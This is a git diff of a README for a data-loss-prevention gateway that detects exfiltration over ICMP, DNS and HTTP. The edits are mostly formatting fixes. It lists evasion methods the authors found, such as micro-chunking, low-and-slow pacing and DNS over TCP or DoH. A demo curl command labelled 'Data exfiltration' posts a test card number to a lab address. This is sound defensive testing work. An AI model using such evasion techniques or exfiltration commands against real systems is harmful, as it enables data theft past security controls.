@@ -78,7 +78,7 @@ The L7 engine runs inside mitmproxy and checks every outbound HTTP(S) request be
 
 #### 3.1 ICMP Covert Channel Detection (WS C)
 
-Standard operating systems generate predictable *ICMP Echo *Request* packets. To detect data tunneling without introducing latency, `icmp_detector.py` evaluates captured frames using three passive checks:
+Standard operating systems generate predictable **ICMP Echo *Request* packets**. To detect data tunneling without introducing latency, `icmp_detector.py` evaluates captured frames using three passive checks:
 
 - **Structural verification (`check_structure`):** Standard OS ping utilities use consistent payload layouts *(Linux defaults to 56 bytes with an 8-byte timestamp; Windows uses 32 fixed ASCII bytes)*. Packets deviating from these conventions trigger:
   - `icmp_oversized_payload`: Payloads exceeding the standard 64-byte limit (`MAX_STANDARD_PAYLOAD_SIZE`).
@@ -141,7 +141,7 @@ Adversarial testing against the baseline DNS detector uncovered algorithmic flaw
 
 #### 4.2 Qualitative Analysis: Limits, Architectural Trade-offs & Defense-in-Depth
 
-#### 1. Architectural Trade-offs & Intrinsic Prototype Limits
+##### 1. Architectural Trade-offs & Intrinsic Prototype Limits
 
 Our gateway uses a hybrid architecture combining an inline L7 proxy (`mitmproxy`), which detects (and is able to block) unauthorized HTTP/HTTPS requests, and a passive L3/L4 sniffer (using `Scapy`), which inspects ICMP and DNS channels.
 
@@ -152,7 +152,7 @@ This split between **request-scoped L7 stream inspection** and **packet-by-packe
 Consequently, our adversarial evaluation highlighted three fundamental categories of detection boundaries across the gateway:
 - **Mathematical Bounds:** Information-theoretic heuristics like Shannon entropy require a minimum sample length to be statistically meaningful. When attackers split data into micro-chunks, the theoretical maximum entropy of short strings stays below detection thresholds, and lowering those thresholds becomes unviable due to high false-positive rates on normal traffic.
 - **Architectural Limits:** Because both our passive L3/L4 sniffer and our request-scoped L7 proxy evaluate transmissions in isolation, they are blind to secrets split across multiple consecutive packets or HTTP requests (evading multi-character regex and Luhn checks). Likewise, protocol-specific capture filters (such as sniffing only UDP port 53) can be bypassed by shifting to alternative transports like DNS over TCP or encrypted channels (DoH/DoT).
-- **Operational Trade-offs:** Rate and volume detectors rely on short in-memory sliding windows to bound memory usage ($1\text{s}$ for ICMP, $60\text{s}$ for DNS). Attackers can evade these thresholds through *low-and-slow* pacing so earlier entries expire before triggering an alert, whereas extending windows to several hours would increase both memory overhead and false alarms on legitimate background traffic.
+- **Operational Trade-offs:** Rate and volume detectors rely on short in-memory sliding windows to bound memory usage (1s for ICMP, 60s for DNS). Attackers can evade these thresholds through *low-and-slow* pacing so earlier entries expire before triggering an alert, whereas extending windows to several hours would increase both memory overhead and false alarms on legitimate background traffic.
 
 ##### 2. Attacker/Defender Asymmetry & Evolution of DLP Controls
 
@@ -219,10 +219,10 @@ docker compose ps
 
 ```bash
 # Legitimate traffic -> Allowed (200 OK)
-docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "user=alice&status=ok"
+docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "user=alice&status=ok"
 
 # Data exfiltration -> Blocked by Gateway (403 Forbidden)
-docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "card=4111-1111-1111-1111"
+docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-1111-1111-1111"
 ```
 
 *Inspect logs:* `docker compose logs -f gateway`
